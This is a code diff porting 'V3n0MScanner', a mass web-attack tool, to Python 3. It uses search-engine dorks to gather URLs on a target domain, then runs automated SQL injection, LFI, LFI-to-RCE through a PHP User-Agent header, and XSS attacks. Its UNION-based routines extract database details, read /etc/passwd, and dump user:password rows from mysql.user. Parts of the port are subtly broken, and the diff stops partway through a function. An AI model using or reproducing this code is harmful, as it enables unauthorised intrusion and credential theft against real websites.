@@ -1,6 +1,13 @@
 #!/usr/bin/python
 # -*- coding: latin-1 -*-
 #              --- To be Done     --Partially implemented     -Done
+#V3n0MScanner.py - V.4.0.0a
+#   ---Redo entire search engine function to run 100 checks per engine at once
+#   - Python 3 upgrade
+#   --- Strip out all old code including redundent SQLi dumper
+#   -- add piping for SQLMap 
+#   -- add scans for known Metasploitable Vulns (* dork based and Nmap style *)
+#
 # V3n0MScanner.py - V.3.2.2
 #   -Fix engines search parameters
 #   -Increase LFI/RFI/XSS Lists if possible
@@ -52,614 +59,615 @@
 
 
 try:
-	import re, random, threading, socket, urllib2, cookielib, subprocess, codecs, signal, time, sys, os, math, itertools
+    import re, random, threading, socket, urllib.request, urllib.error, urllib.parse, http.cookiejar, subprocess, \
+        codecs, signal, time, sys, os, math, itertools
 except:
-	print " please make sure you have all of the following modules: re, random, threading, socket, urllib2, cookielib, subprocess, codecs, signal, time, sys, os, math, itertools"
-	exit()
+    print(
+            " please make sure you have all of the following modules: re, random, threading, socket, urllib2, cookielib, subprocess, codecs, signal, time, sys, os, math, itertools")
+    exit()
+
 
 # Banner
 def logo():
-	print R + "\n|----------------------------------------------------------------|"
-	print "|     V3n0mScanner.py                                            |"
-	print "|     Release Date 02/12/2013  - Release Version V.3.3.2         |"
-	print "|          						         |"
-	print "|          " + B + "   NovaCygni  Architect  d4rkcat" + R + "                      |"
-	print "|                    _____       _____                           |"
-	print "|          " + G + "         |____ |     |  _  |    " + R + "                      |"
-	print "|             __   __   / /_ __ | |/' |_ _" + G + "_ ___             " + R + "     |"
-	print "|             \ \ / /  " + G + " \ \ '" + R + "_ \|  /| | '_ ` _ \                 |"
-	print "|              \ V" + G + " /.___/ / | | \ |_" + R + "/ / | | | | |                |"
-	print "|    Official   \_/" + G + " \____/|_" + R + "| |_|" + G + "\___/|_| |_| " + R + "|_|  Release       |"
-	print "|    							         |"
-	print "|----------------------------------------------------------------|\n"
+    print(R + "\n|----------------------------------------------------------------|")
+    print("|     V3n0mScanner.py                                            |")
+    print("|     Release Date 02/12/2013  - Release Version V.4.0.0a        |")
+    print("|          						         |")
+    print("|          " + B + "   NovaCygni  Architect         " + R + "                      |")
+    print("|                    _____       _____                           |")
+    print("|          " + G + "         |____ |     |  _  |    " + R + "                      |")
+    print("|             __   __   / /_ __ | |/' |_ _" + G + "_ ___             " + R + "     |")
+    print("|             \ \ / /  " + G + " \ \ '" + R + "_ \|  /| | '_ ` _ \                 |")
+    print("|              \ V" + G + " /.___/ / | | \ |_" + R + "/ / | | | | |                |")
+    print("|    Official   \_/" + G + " \____/|_" + R + "| |_|" + G + "\___/|_| |_| " + R + "|_|  Release       |")
+    print("|    							         |")
+    print("|----------------------------------------------------------------|\n")
 
-def killpid(signum = 0, frame = 0):
-	print "\r\x1b[K"
-	os.kill(os.getpid(), 9)
+
+def killpid(signum=0, frame=0):
+    print("\r\x1b[K")
+    os.kill(os.getpid(), 9)
+
 
 def search(maxc):
-	urls = []
-	urls_len_last = 0
-	for site in sitearray:
-		dark = 0
-		for dork in go:
-			dark += 1
-			page = 0
-			try:
-				while page < int(maxc):
-					try:
-						jar = cookielib.FileCookieJar("cookies")
-						query = dork + "+site:" + site
-						results_web = 'http://www.galaxy.com/search/gsite?cx=partner-pub-7997125561256657%3Aihfdd571hqo&cof=FORID%3A10&ie=UTF-8&q=' + query + 'hl=en&page=' + repr(
-							page) + '&src=hmp' and 'http://www.search-results.com/web?o=&tpr=1&q=' + query + '&hl=en&page=' + repr(
-							page) + '&src=hmp' and 'http://blekko.com/#?q=' + query + '&hl=en&page=' + repr(
-							page) + '&src=hmp' and 'http://search.lycos.com/web?q=' + query + '&hl=en&page=' + repr(
-							page) + '&src=hmp' and 'http://www.webcrawler.com/search/web?fcoid=421&fcop=topnav&fpid=27&aid=ab8d8d87-cd66-4573-898b-e2585c92c0ba&ridx=1&q=' + query + '&hl=en&page=' + repr(
-							page) + '&src=hmp' and 'http://msxml.excite.com/search/web?q=' + query + '&hl=en&page=' + repr(
-							page) + '&src=hmp' and 'https://duckduckgo.com/?q=' + query + '&hl=en&page=' + repr(
-							page) + '&src=hmp' and 'https://www.gigablast.com/search?k8c=17319&q=' + query + '&hl=en&page=' + repr(
-							page) + '&src=hmp' and 'http://www.gibiru.com/?cx=partner-pub-5956360965567042%3A8627692578&cof=FORID%3A11&ie=UTF-8&q=' + query + '&hl=en&page=' + repr(
-							page) + '&src=hmp' and 'http://www.dogpile.com/info.dogpl.t10.5/search/web?fcoid=417&fcop=topnav&fpid=27&q=' + query + '&hl=en&page=' + repr(
-							page) + '&src=hmp' and 'http://www.bing.com/search?q=' + query + '&hl=en&page=' + repr(
-							page) + '&src=hmp'
-						request_web = urllib2.Request(results_web)
-						agent = random.choice(header)
-						request_web.add_header('User-Agent', agent)
-						opener_web = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
-						text = opener_web.open(request_web).read()
-						stringreg = re.compile('(?<=href=")(.*?)(?=")')
-						names = stringreg.findall(text)
-						page += 1
-						for name in names:
-							if name not in urls:
-								if re.search(r'\(', name) or re.search("<", name) or re.search("\A/",
-																							   name) or re.search(
-										"\A(http://)\d", name):
-									pass
-								elif re.search("google", name) or re.search("youtube", name) or re.search("phpbuddy",
-																										  name) or re.search(
-										"iranhack", name) or re.search("phpbuilder", name) or re.search("codingforums",
-																										name) or re.search(
-										"phpfreaks", name) or re.search("%", name) or re.search("facebook",
-																								name) or re.search(
-										"twitter", name) or re.search("hackforums", name) or re.search("askjeeves",
-																									   name) or re.search(
-										"wordpress", name) or re.search("github", name):
-									pass
-								elif re.search(site, name):
-									urls.append(name)
-						darklen = len(go)
-						percent = int((1.0 * dark / int(darklen)) * 100)
-						urls_len = len(urls)
-						sys.stdout.write(
-							"\r\x1b[KSite: %s | Collected urls: %s | D0rks: %s/%s | Percent Done: %s | Current page no.: <%s> | Dork: %s" % (
-							site, repr(urls_len), dark, darklen, repr(percent), repr(page), dork))
-						sys.stdout.flush()
-						if urls_len == urls_len_last:
-							page = int(maxc)
-						urls_len_last = len(urls)
+    urls = []
+    urls_len_last = 0
+    for site in sitearray:
+        dark = 0
+        for dork in go:
+            dark += 1
+            page = 0
+            try:
+                while page < int(maxc):
+                    try:
+                        jar = http.cookiejar.FileCookieJar("cookies")
+                        query = dork + "+site:" + site
+                        results_web = 'http://www.bing.com/search?q=' + query + '&hl=en&page=' + repr(
+                                page) + '&src=hmp'
+                        request_web = urllib.request.Request(results_web)
+                        agent = random.choice(header)
+                        request_web.add_header('User-Agent', agent)
+                        opener_web = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
+                        text = opener_web.open(request_web).read()
+                        decoder = text.decode('utf-8')
+                        stringreg = re.compile('(?<=href=")(.*?)(?=")')
+                        names = stringreg.findall(decoder)
+                        page += 1
+                        for name in names:
+                            if name not in urls:
+                                if re.search(r'\(', name) or re.search("<", name) or re.search("\A/",
+                                                                                               name) or re.search(
+                                        "\A(http://)\d", name):
+                                    pass
+                                elif re.search("google", name) or re.search("youtube", name) or re.search("phpbuddy",
+                                                                                                          name) or re.search(
+                                        "iranhack", name) or re.search("phpbuilder", name) or re.search("codingforums",
+                                                                                                        name) or re.search(
+                                        "phpfreaks", name) or re.search("%", name) or re.search("facebook",
+                                                                                                name) or re.search(
+                                        "twitter", name) or re.search("hackforums", name) or re.search("askjeeves",
+                                                                                                       name) or re.search(
+                                        "wordpress", name) or re.search("github", name):
+                                    pass
+                                elif re.search(site, name):
+                                    urls.append(name)
+                        darklen = len(go)
+                        percent = int((1.0 * dark / int(darklen)) * 100)
+                        urls_len = len(urls)
+                        sys.stdout.write(
+                                "\r\x1b[KSite: %s | Collected urls: %s | D0rks: %s/%s | Percent Done: %s | Current page no.: <%s> | Dork: %s" % (
+                                    site, repr(urls_len), dark, darklen, repr(percent), repr(page), dork))
+                        sys.stdout.flush()
+                        if urls_len == urls_len_last:
+                            page = int(maxc)
+                        urls_len_last = len(urls)
+                    except(KeyboardInterrupt, SystemExit):
+                        raise
+            except(urllib.error.URLError, socket.gaierror, socket.error, socket.timeout,): KeyboardInterrupt
+            pass
+    tmplist = []
+    print("\n\n[+] URLS (unsorted): ", len(urls))
+    for url in urls:
+        try:
+            host = url.split("/", 3)
+            domain = host[2]
+            if domain not in tmplist and "=" in url:
+                finallist.append(url)
+                tmplist.append(domain)
 
-					except:
-						pass
-			except KeyboardInterrupt:
-				pass
-		tmplist = []
-		print "\n\n[+] URLS (unsorted): ", len(urls)
-		for url in urls:
-			try:
-				host = url.split("/", 3)
-				domain = host[2]
-				if domain not in tmplist and "=" in url:
-					finallist.append(url)
-					tmplist.append(domain)
-
-			except:
-				pass
-		print "[+] URLS (sorted)  : ", len(finallist)
-		return finallist
+        except:
+            pass
+    print("[+] URLS (sorted)  : ", len(finallist))
+    return finallist
 
 
 class Injthread(threading.Thread):
-	def __init__(self, hosts):
-		self.hosts = hosts
-		self.fcount = 0
-		self.check = True
-		threading.Thread.__init__(self)
+    def __init__(self, hosts):
+        self.hosts = hosts
+        self.fcount = 0
+        self.check = True
+        threading.Thread.__init__(self)
 
-	def run(self):
-		urls = list(self.hosts)
-		for url in urls:
-			try:
-				if self.check:
-					classicinj(url)
-				else:
-					break
-			except(KeyboardInterrupt, ValueError):
-				pass
-		self.fcount += 1
+    def run(self):
+        urls = list(self.hosts)
+        for url in urls:
+            try:
+                if self.check:
+                    classicinj(url)
+                else:
+                    break
+            except(KeyboardInterrupt, ValueError):
+                pass
+        self.fcount += 1
 
-	def stop(self):
-		self.check = False
+    def stop(self):
+        self.check = False
 
 
 class Lfithread(threading.Thread):
-	def __init__(self, hosts):
-		self.hosts = hosts
-		self.fcount = 0
-		self.check = True
-		threading.Thread.__init__(self)
+    def __init__(self, hosts):
+        self.hosts = hosts
+        self.fcount = 0
+        self.check = True
+        threading.Thread.__init__(self)
 
-	def run(self):
-		urls = list(self.hosts)
-		for url in urls:
-			try:
-				if self.check:
-					classiclfi(url)
-				else:
-					break
-			except(KeyboardInterrupt, ValueError):
-				pass
-		self.fcount += 1
+    def run(self):
+        urls = list(self.hosts)
+        for url in urls:
+            try:
+                if self.check:
+                    classiclfi(url)
+                else:
+                    break
+            except(KeyboardInterrupt, ValueError):
+                pass
+        self.fcount += 1
 
-	def stop(self):
-		self.check = False
+    def stop(self):
+        self.check = False
 
 
 class Xssthread(threading.Thread):
-	def __init__(self, hosts):
-		self.hosts = hosts
-		self.fcount = 0
-		self.check = True
-		threading.Thread.__init__(self)
+    def __init__(self, hosts):
+        self.hosts = hosts
+        self.fcount = 0
+        self.check = True
+        threading.Thread.__init__(self)
 
-	def run(self):
-		urls = list(self.hosts)
-		for url in urls:
-			try:
-				if self.check:
-					classicxss(url)
-				else:
-					break
-			except(KeyboardInterrupt, ValueError):
-				pass
-		self.fcount += 1
+    def run(self):
+        urls = list(self.hosts)
+        for url in urls:
+            try:
+                if self.check:
+                    classicxss(url)
+                else:
+                    break
+            except(KeyboardInterrupt, ValueError):
+                pass
+        self.fcount += 1
 
-	def stop(self):
-		self.check = False
+    def stop(self):
+        self.check = False
 
 
 def classicinj(url):
-	#noinspection PyPep8Naming,PyPep8Naming
-	EXT = "'"
-	host = url + EXT
-	try:
-		source = urllib2.urlopen(host).read()
-		for type, eMSG in sqlerrors.items():
-			if re.search(eMSG, source):
-				print R + "[SQLi]:", O + host, B + "Error:", type, R + " ---> SQL Injection Found"
-				logfile.write("\n" + host)
-				vuln.append(host)
-				col.append(host)
-				break
-			else:
-				pass
-	except:
-		pass
+    # noinspection PyPep8Naming,PyPep8Naming
+    EXT = "'"
+    host = url + EXT
+    try:
+        source = urllib.request.urlopen(host).read()
+        for type, eMSG in list(sqlerrors.items()):
+            if re.search(eMSG, source):
+                print(R + "[SQLi]:", O + host, B + "Error:", type, R + " ---> SQL Injection Found")
+                logfile.write("\n" + host)
+                vuln.append(host)
+                col.append(host)
+                break
+            else:
+                pass
+    except:
+        pass
 
 
 def classiclfi(url):
-	lfiurl = url.rsplit('=', 1)[0]
-	if lfiurl[-1] != "=":
-		lfiurl = lfiurl + "="
-	for lfi in lfis:
-		try:
-			check = urllib2.urlopen(lfiurl + lfi.replace("\n", "")).read()
-			if re.findall("root:x", check):
-				print R + "[LFI]: ", O + lfiurl + lfi, R + " ---> Local File Include Found"
-				lfi_log_file.write("\n" + lfiurl + lfi)
-				vuln.append(lfiurl + lfi)
-				target = lfiurl + lfi
-				target = target.replace("/etc/passwd", "/proc/self/environ", "/etc/passwd%00")
-				header = "<? echo md5(NovaCygni); ?>"
-				try:
-					request_web = urllib2.Request(target)
-					request_web.add_header('User-Agent', header)
-					text = urllib2.urlopen(request_web)
-					text = text.read()
-					if re.findall("7ca328e93601c940f87d01df2bbd1972", text):
-						print R + "[LFI > RCE]: ", O + target, R + " ---> LFI to RCE Found"
-						rce_log_file.write("\n", target)
-						vuln.append(target)
-				except:
-					pass
+    lfiurl = url.rsplit('=', 1)[0]
+    if lfiurl[-1] != "=":
+        lfiurl = lfiurl + "="
+    for lfi in lfis:
+        try:
+            check = urllib.request.urlopen(lfiurl + lfi.replace("\n", "")).read()
+            if re.findall("root:x", check):
+                print(R + "[LFI]: ", O + lfiurl + lfi, R + " ---> Local File Include Found")
+                lfi_log_file.write("\n" + lfiurl + lfi)
+                vuln.append(lfiurl + lfi)
+                target = lfiurl + lfi
+                target = target.replace("/etc/passwd", "/proc/self/environ", "/etc/passwd%00")
+                header = "<? echo md5(NovaCygni); ?>"
+                try:
+                    request_web = urllib.request.Request(target)
+                    request_web.add_header('User-Agent', header)
+                    text = urllib.request.urlopen(request_web)
+                    text = text.read()
+                    if re.findall("7ca328e93601c940f87d01df2bbd1972", text):
+                        print(R + "[LFI > RCE]: ", O + target, R + " ---> LFI to RCE Found")
+                        rce_log_file.write("\n", target)
+                        vuln.append(target)
+                except:
+                    pass
 
-		except:
-			pass
+        except:
+            pass
 
 
 def classicxss(url):
-	for xss in xsses:
-		if url not in vuln:
-			try:
-				source = urllib2.urlopen(url + xss.replace("\n", "")).read()
-				if re.findall("<OY1Py", source) or re.findall("<LOY2PyTRurb1c", source):
-					print R + "\r\x1b[K[XSS]: ", O + url + xss, R + " ---> XSS Found"
-					xss_log_file.write("\n" + url + xss)
-					vuln.append(url)
-			except:
-				if len(xss + url) < 147:
-					sys.stdout.write(
-					B + "\r\x1b[K [*] Testing %s%s" % (
-					url, xss))
-					sys.stdout.flush()
+    for xss in xsses:
+        if url not in vuln:
+            try:
+                source = urllib.request.urlopen(url + xss.replace("\n", "")).read()
+                if re.findall("<OY1Py", source) or re.findall("<LOY2PyTRurb1c", source):
+                    print(R + "\r\x1b[K[XSS]: ", O + url + xss, R + " ---> XSS Found")
+                    xss_log_file.write("\n" + url + xss)
+                    vuln.append(url)
+            except:
+                if len(xss + url) < 147:
+                    sys.stdout.write(
+                            B + "\r\x1b[K [*] Testing %s%s" % (
+                                url, xss))
+                    sys.stdout.flush()
 
 
 def injtest():
-	global logfile
-	log = "v3n0m-sqli.txt"
-	logfile = open(log, "a")
-	print B + "\n[+] Preparing for SQLi scanning ..."
-	print "[+] Can take a while ..."
-	print "[!] Working ...\n"
-	i = len(usearch) / int(numthreads)
-	m = len(usearch) % int(numthreads)
-	z = 0
-	if len(threads) <= numthreads:
-		for x in range(0, int(numthreads)):
-			sliced = usearch[x * i:(x + 1) * i]
-			if z < m:
-				sliced.append(usearch[int(numthreads) * i + z])
-				z += 1
-			thread = Injthread(sliced)
-			thread.start()
-			threads.append(thread)
-		for thread in threads:
-			thread.join()
+    global logfile
+    log = "v3n0m-sqli.txt"
+    logfile = open(log, "a")
+    print(B + "\n[+] Preparing for SQLi scanning ...")
+    print("[+] Can take a while ...")
+    print("[!] Working ...\n")
+    i = len(usearch) / int(numthreads)
+    m = len(usearch) % int(numthreads)
+    z = 0
+    if len(threads) <= numthreads:
+        for x in range(0, int(numthreads)):
+            sliced = usearch[x * i:(x + 1) * i]
+            if z < m:
+                sliced.append(usearch[int(numthreads) * i + z])
+                z += 1
+            thread = Injthread(sliced)
+            thread.start()
+            threads.append(thread)
+        for thread in threads:
+            thread.join()
 
 
 def lfitest():
-	print B + "\n[+] Preparing for LFI - RCE scanning ..."
-	print "[+] Can take a while ..."
-	print "[!] Working ...\n"
-	i = len(usearch) / int(numthreads)
-	m = len(usearch) % int(numthreads)
-	z = 0
-	if len(threads) <= numthreads:
-		for x in range(0, int(numthreads)):
-			sliced = usearch[x * i:(x + 1) * i]
-			if z < m:
-				sliced.append(usearch[int(numthreads) * i + z])
-				z += 1
-			thread = Lfithread(sliced)
-			thread.start()
-			threads.append(thread)
-		for thread in threads:
-			thread.join()
+    print(B + "\n[+] Preparing for LFI - RCE scanning ...")
+    print("[+] Can take a while ...")
+    print("[!] Working ...\n")
+    i = len(usearch) / int(numthreads)
+    m = len(usearch) % int(numthreads)
+    z = 0
+    if len(threads) <= numthreads:
+        for x in range(0, int(numthreads)):
+            sliced = usearch[x * i:(x + 1) * i]
+            if z < m:
+                sliced.append(usearch[int(numthreads) * i + z])
+                z += 1
+            thread = Lfithread(sliced)
+            thread.start()
+            threads.append(thread)
+        for thread in threads:
+            thread.join()
 
 
 def xsstest():
-	print B + "\n[+] Preparing for XSS scanning ..."
-	print "[+] Can take a while ..."
-	print "[!] Working ...\n"
-	i = len(usearch) / int(numthreads)
-	m = len(usearch) % int(numthreads)
-	z = 0
-	if len(threads) <= numthreads:
-		for x in range(0, int(numthreads)):
-			sliced = usearch[x * i:(x + 1) * i]
-			if z < m:
-				sliced.append(usearch[int(numthreads) * i + z])
-				z += 1
-			thread = Xssthread(sliced)
-			thread.start()
-			threads.append(thread)
-		for thread in threads:
-			thread.join()
+    print(B + "\n[+] Preparing for XSS scanning ...")
+    print("[+] Can take a while ...")
+    print("[!] Working ...\n")
+    i = len(usearch) / int(numthreads)
+    m = len(usearch) % int(numthreads)
+    z = 0
+    if len(threads) <= numthreads:
+        for x in range(0, int(numthreads)):
+            sliced = usearch[x * i:(x + 1) * i]
+            if z < m:
+                sliced.append(usearch[int(numthreads) * i + z])
+                z += 1
+            thread = Xssthread(sliced)
+            thread.start()
+            threads.append(thread)
+        for thread in threads:
+            thread.join()
+
 
 def colfinder():
-	print B + "\n[+] Preparing for Column Finder ..."
-	print "[+] Can take a while ..."
-	print "[!] Working ..."
-	# Thanks rsauron for schemafuzz
-	for host in col:
-		print R + "\n[+] Target: ", O + host
-		print R + "[+] Attempting to find the number of columns ..."
-		print "[+] Testing: ",
-		checkfor = []
-		host = host.rsplit("'", 1)[0]
-		sitenew = host + arg_eva + "and" + arg_eva + "1=2" + arg_eva + "union" + arg_eva + "all" + arg_eva + "select" + arg_eva
-		makepretty = ""
-		for x in xrange(0, colMax):
-			try:
-				sys.stdout.write("%s," % x)
-				sys.stdout.flush()
-				darkc0de = "dark" + str(x) + "c0de"
-				checkfor.append(darkc0de)
-				if x > 0:
-					sitenew += ","
-				sitenew += "0x" + darkc0de.encode("hex")
-				finalurl = sitenew + arg_end
-				gets += 1
-				source = urllib2.urlopen(finalurl).read()
-				for y in checkfor:
-					colFound = re.findall(y, source)
-					if len(colFound) >= 1:
-						print "\n[+] Column length is:", len(checkfor)
-						nullcol = re.findall("\d+", y)
-						print "[+] Found null column at column #:", nullcol[0]
-						for z in xrange(0, len(checkfor)):
-							if z > 0:
-								makepretty += ","
-							makepretty += str(z)
-						site = host + arg_eva + "and" + arg_eva + "1=2" + arg_eva + "union" + arg_eva + "all" + arg_eva + "select" + arg_eva + makepretty
-						print "[+] SQLi URL:", site + arg_end
-						site = site.replace("," + nullcol[0] + ",", ",darkc0de,")
-						site = site.replace(arg_eva + nullcol[0] + ",", arg_eva + "darkc0de,")
-						site = site.replace("," + nullcol[0], ",darkc0de")
-						print "[+] darkc0de URL:", site
-						darkurl.append(site)
+    print(B + "\n[+] Preparing for Column Finder ...")
+    print("[+] Can take a while ...")
+    print("[!] Working ...")
+    # Thanks rsauron for schemafuzz
+    for host in col:
+        print(R + "\n[+] Target: ", O + host)
+        print(R + "[+] Attempting to find the number of columns ...")
+        print("[+] Testing: ", end=' ')
+        checkfor = []
+        host = host.rsplit("'", 1)[0]
+        sitenew = host + arg_eva + "and" + arg_eva + "1=2" + arg_eva + "union" + arg_eva + "all" + arg_eva + "select" + arg_eva
+        makepretty = ""
+        for x in range(0, colMax):
+            try:
+                sys.stdout.write("%s," % x)
+                sys.stdout.flush()
+                darkc0de = "dark" + str(x) + "c0de"
+                checkfor.append(darkc0de)
+                if x > 0:
+                    sitenew += ","
+                sitenew += "0x" + darkc0de.encode("hex")
+                finalurl = sitenew + arg_end
+                gets += 1
+                source = urllib.request.urlopen(finalurl).read()
+                for y in checkfor:
+                    colFound = re.findall(y, source)
+                    if len(colFound) >= 1:
+                        print("\n[+] Column length is:", len(checkfor))
+                        nullcol = re.findall("\d+", y)
+                        print("[+] Found null column at column #:", nullcol[0])
+                        for z in range(0, len(checkfor)):
+                            if z > 0:
+                                makepretty += ","
+                            makepretty += str(z)
+                        site = host + arg_eva + "and" + arg_eva + "1=2" + arg_eva + "union" + arg_eva + "all" + arg_eva + "select" + arg_eva + makepretty
+                        print("[+] SQLi URL:", site + arg_end)
+                        site = site.replace("," + nullcol[0] + ",", ",darkc0de,")
+                        site = site.replace(arg_eva + nullcol[0] + ",", arg_eva + "darkc0de,")
+                        site = site.replace("," + nullcol[0], ",darkc0de")
+                        print("[+] darkc0de URL:", site)
+                        darkurl.append(site)
 
-						print "[-] Done!\n"
-						break
+                        print("[-] Done!\n")
+                        break
 
-			except(KeyboardInterrupt, SystemExit):
-				raise
-			except:
-				pass
+            except(KeyboardInterrupt, SystemExit):
+                raise
+            except:
+                pass
 
-		print "\n[!] Sorry column length could not be found\n"
-	###########
+        print("\n[!] Sorry column length could not be found\n")
+    ###########
 
-	print B + "\n[+] Gathering MySQL Server Configuration..."
-	for site in darkurl:
-		head_URL = site.replace("evilzone",
-								"concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20)") + arg_end
-		print R + "\n[+] Target:", O + site
-		while 1:
-			try:
-				gets += 1
-				source = urllib2.urlopen(head_URL).read()
-				match = re.findall("\x1e\x1e\S+", source)
-				if len(match) >= 1:
-					match = match[0][2:].split("\x1e")
-					version = match[0]
-					user = match[1]
-					database = match[2]
-					print W + "\n\tDatabase:", database
-					print "\tUser:", user
-					print "\tVersion:", version
-					version = version[0]
+    print(B + "\n[+] Gathering MySQL Server Configuration...")
+    for site in darkurl:
+        head_URL = site.replace("evilzone",
+                                "concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20)") + arg_end
+        print(R + "\n[+] Target:", O + site)
+        while 1:
+            try:
+                gets += 1
+                source = urllib.request.urlopen(head_URL).read()
+                match = re.findall("\x1e\x1e\S+", source)
+                if len(match) >= 1:
+                    match = match[0][2:].split("\x1e")
+                    version = match[0]
+                    user = match[1]
+                    database = match[2]
+                    print(W + "\n\tDatabase:", database)
+                    print("\tUser:", user)
+                    print("\tVersion:", version)
+                    version = version[0]
 
-					load = site.replace("evilzone", "load_file(0x2f6574632f706173737764)")
-					source = urllib2.urlopen(load).read()
-					if re.findall("root:x", source):
-						load = site.replace("evilzone", "concat_ws(char(58),load_file(0x" + file.encode(
-							"hex") + "),0x62616c74617a6172)")
-						source = urllib2.urlopen(load).read()
-						search = re.findall("NovaCygni", source)
-						if len(search) > 0:
-							print "\n[!] w00t!w00t!: " + site.replace("evilzone",
-																	  "load_file(0x" + file.encode("hex") + ")")
+                    load = site.replace("evilzone", "load_file(0x2f6574632f706173737764)")
+                    source = urllib.request.urlopen(load).read()
+                    if re.findall("root:x", source):
+                        load = site.replace("evilzone", "concat_ws(char(58),load_file(0x" + file.encode(
+                                "hex") + "),0x62616c74617a6172)")
+                        source = urllib.request.urlopen(load).read()
+                        search = re.findall("NovaCygni", source)
+                        if len(search) > 0:
+                            print("\n[!] w00t!w00t!: " + site.replace("evilzone",
+                                                                      "load_file(0x" + file.encode("hex") + ")"))
 
-						load = site.replace("evilzone",
-											"concat_ws(char(58),user,password,0x62616c74617a6172)") + arg_eva + "from" + arg_eva + "mysql.user"
-					source = urllib2.urlopen(load).read()
-					if re.findall("NovaCygni", source):
-						print "\n[!] w00t!w00t!: " + site.replace("evilzone",
-																  "concat_ws(char(58),user,password)") + arg_eva + "from" + arg_eva + "mysql.user"
+                        load = site.replace("evilzone",
+                                            "concat_ws(char(58),user,password,0x62616c74617a6172)") + arg_eva + "from" + arg_eva + "mysql.user"
+                    source = urllib.request.urlopen(load).read()
+                    if re.findall("NovaCygni", source):
+                        print("\n[!] w00t!w00t!: " + site.replace("evilzone",
+                                                                  "concat_ws(char(58),user,password)") + arg_eva + "from" + arg_eva + "mysql.user")
 
-				print W + "\n[+] Number of tables:", len(tables)
-				print "[+] Number of columns:", len(columns)
-				print "[+] Checking for tables and columns..."
-				target = site.replace("evilzone", "0x62616c74617a6172") + arg_eva + "from" + arg_eva + "T"
-				for table in tables:
-					try:
-						target_table = target.replace("T", table)
-						source = urllib2.urlopen(target_table).read()
-						search = re.findall("NovaCygni", source)
-						if len(search) > 0:
-							print "\n[!] Table found: < " + table + " >"
-							print "\n[+] Lets check for columns inside table < " + table + " >"
-							for column in columns:
-								try:
-									source = urllib2.urlopen(target_table.replace("0x62616c74617a6172",
-																				  "concat_ws(char(58),0x62616c74617a6172," + column + ")")).read()
-									search = re.findall("NovaCygni", source)
-									if len(search) > 0:
-										print "\t[!] Column found: < " + column + " >"
-								except(KeyboardInterrupt, SystemExit):
-									raise
-								except(urllib2.URLError, socket.gaierror, socket.error, socket.timeout):
-									pass
+                print(W + "\n[+] Number of tables:", len(tables))
+                print("[+] Number of columns:", len(columns))
+                print("[+] Checking for tables and columns...")
+                target = site.replace("evilzone", "0x62616c74617a6172") + arg_eva + "from" + arg_eva + "T"
+                for table in tables:
+                    try:
+                        target_table = target.replace("T", table)
+                        source = urllib.request.urlopen(target_table).read()
+                        search = re.findall("NovaCygni", source)
+                        if len(search) > 0:
+                            print("\n[!] Table found: < " + table + " >")
+                            print("\n[+] Lets check for columns inside table < " + table + " >")
+                            for column in columns:
+                                try:
+                                    source = urllib.request.urlopen(target_table.replace("0x62616c74617a6172",
+                                                                                         "concat_ws(char(58),0x62616c74617a6172," + column + ")")).read()
+                                    search = re.findall("NovaCygni", source)
+                                    if len(search) > 0:
+                                        print("\t[!] Column found: < " + column + " >")
+                                except(KeyboardInterrupt, SystemExit):
+                                    raise
+                                except(urllib.error.URLError, socket.gaierror, socket.error, socket.timeout):
+                                    pass
 
-							print "\n[-] Done searching inside table < " + table + " > for columns!"
+                            print("\n[-] Done searching inside table < " + table + " > for columns!")
 
-					except(KeyboardInterrupt, SystemExit):
-						raise
-					except(urllib2.URLError, socket.gaierror, socket.error, socket.timeout):
-						pass
-				print "[!] Fuzzing is finished!"
-				break
-			except(KeyboardInterrupt, SystemExit):
-				raise
+                    except(KeyboardInterrupt, SystemExit):
+                        raise
+                    except(urllib.error.URLError, socket.gaierror, socket.error, socket.timeout):
+                        pass
+                print("[!] Fuzzing is finished!")
+                break
+            except(KeyboardInterrupt, SystemExit):
+                raise
+
 
 def fscan():
-	global maxc
-	global usearch
-	global numthreads
-	global threads
-	global finallist
-	global col
-	global darkurl
-	global sitearray
-	global go
+    global maxc
+    global usearch
+    global numthreads
+    global threads
+    global finallist
+    global col
+    global darkurl
+    global sitearray
+    global go
 
-	threads = []
-	finallist = []
-	vuln = []
-	col = []
-	darkurl = []
-	go = []
+    threads = []
+    finallist = []
+    vuln = []
+    col = []
+    darkurl = []
+    go = []
 
-	print W
-	sites = raw_input("\nChoose your target(domain)   : ")
-	sitearray = [sites]
+    print(W)
+    sites = input("\nChoose your target(domain)   : ")
+    sitearray = [sites]
 
-	dorks = raw_input("Choose the number of random dorks (0 for all.. may take awhile!)   : ")
-	print ""
-	if int(dorks) == 0:
-		i = 0
-		while i < len(d0rk):
-			go.append(d0rk[i])
-			i += 1
-	else:
-		i = 0
-		while i < int(dorks):
-			go.append(d0rk[i])
-			i += 1
-		for g in go:
-			print "dork: ", g
+    dorks = input("Choose the number of random dorks (0 for all.. may take awhile!)   : ")
+    print("")
+    if int(dorks) == 0:
+        i = 0
+        while i < len(d0rk):
+            go.append(d0rk[i])
+            i += 1
+    else:
+        i = 0
+        while i < int(dorks):
+            go.append(d0rk[i])
+            i += 1
+        for g in go:
+            print("dork: ", g)
 
-	numthreads = raw_input('\nEnter no. of threads : ')
-	maxc = raw_input('Enter no. of pages   : ')
-	print "\nNumber of SQL errors :", len(sqlerrors)
-	print "LFI payloads    :", len(lfis)
-	print "XSS payloads    :", len(xsses)
-	print "Headers         :", len(header)
-	print "Threads         :", numthreads
-	print "Dorks           :", len(go)
-	print "Pages           :", maxc
-	print "Timeout         :", timeout
-	print "Search Engines  : 11"
-	print "Encrypted SE    : 3"
-	print ""
-	print ""
+    numthreads = input('\nEnter no. of threads : ')
+    maxc = input('Enter no. of pages   : ')
+    print("\nNumber of SQL errors :", len(sqlerrors))
+    print("LFI payloads    :", len(lfis))
+    print("XSS payloads    :", len(xsses))
+    print("Headers         :", len(header))
+    print("Threads         :", numthreads)
+    print("Dorks           :", len(go))
+    print("Pages           :", maxc)
+    print("Timeout         :", timeout)
+    print("Search Engines  : 11")
+    print("Encrypted SE    : 3")
+    print("")
+    print("")
 
-	usearch = search(maxc)
-	vulnscan()
+    usearch = search(maxc)
+    vulnscan()
+
 
 def vulnscan():
-	global endsub
-	global lfi_log
-	global rce_log
-	global xss_log_file
-	global admin_log_file
-	global vuln
+    global endsub
+    global lfi_log
+    global rce_log
+    global xss_log_file
+    global admin_log_file
